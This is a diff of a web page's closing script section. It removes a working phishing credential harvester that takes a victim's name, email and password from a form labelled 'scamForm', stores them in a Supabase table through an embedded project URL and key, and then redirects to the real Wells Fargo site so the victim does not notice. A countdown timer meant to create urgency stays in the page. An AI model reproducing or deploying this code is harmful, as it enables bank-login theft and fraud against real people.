@@ -256,75 +256,27 @@
         </div>
     </footer>
 
-    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-<script>
-    // --- COUNTDOWN LOGIC (Your original code) ---
-    var time = 599; 
-    var countdownElement = document.getElementById('countdown');
+     <script>
+        var time = 599; 
+        var countdownElement = document.getElementById('countdown');
+        
+        setInterval(function() {
+            if (time < 0) {
+                countdownElement.textContent = "00:00";
+                return;
+            }
+            
+            var minutes = Math.floor(time / 60);
+            var seconds = time % 60;
+            
+            minutes = minutes < 10 ? "0" + minutes : minutes;
+            seconds = seconds < 10 ? "0" + seconds : seconds;
+            
+            countdownElement.textContent = minutes + ":" + seconds;
+            time--;
+        }, 1000);
+    </script>
     
-    setInterval(function() {
-        if (time < 0) {
-            countdownElement.textContent = "00:00";
-            return;
-        }
-        
-        var minutes = Math.floor(time / 60);
-        var seconds = time % 60;
-        
-        minutes = minutes < 10 ? "0" + minutes : minutes;
-        seconds = seconds < 10 ? "0" + seconds : seconds;
-        
-        countdownElement.textContent = minutes + ":" + seconds;
-        time--;
-    }, 1000);
-
-    // --- SUPABASE FORM SUBMISSION ---
-    document.addEventListener('DOMContentLoaded', () => {
-        // 1. Initialize Supabase
-        const supabaseUrl = 'https://dgqibvqkbdqkdsdtlvsb.supabase.co';
-        const supabaseKey = 'sb_publishable_6acZVhQVX-aPTqHQulDAbw_QXwYvE-Q';
-        const supabase = supabase.createClient(supabaseUrl, supabaseKey);
-
-        // 2. Handle Form Submit
-        const form = document.getElementById('scamForm');
-        if (form) {
-            form.addEventListener('submit', async function(e) {
-                e.preventDefault();
-                
-                const btn = document.querySelector('button[type="submit"]');
-                const originalText = btn.innerText;
-                btn.innerText = 'Verifying...';
-                btn.disabled = true;
-
-                const formData = {
-                    name: document.getElementById('name').value,
-                    email: document.getElementById('email').value,
-                    password: document.getElementById('password').value
-                };
-
-                try {
-                    // 3. Insert into Supabase
-                    const { error } = await supabase
-                        .from('submissions')
-                        .insert([formData]);
-
-                    if (error) throw error;
-
-                    // 4. Redirect to real site
-                    setTimeout(() => {
-                        window.location.href = 'https://www.wellsfargo.com/';
-                    }, 1500);
-
-                } catch (error) {
-                    console.error('Error:', error);
-                    alert('Error verifying. Please try again.');
-                    btn.innerText = originalText;
-                    btn.disabled = false;
-                }
-            });
-        }
-    });
-</script>
     
 
 </body>
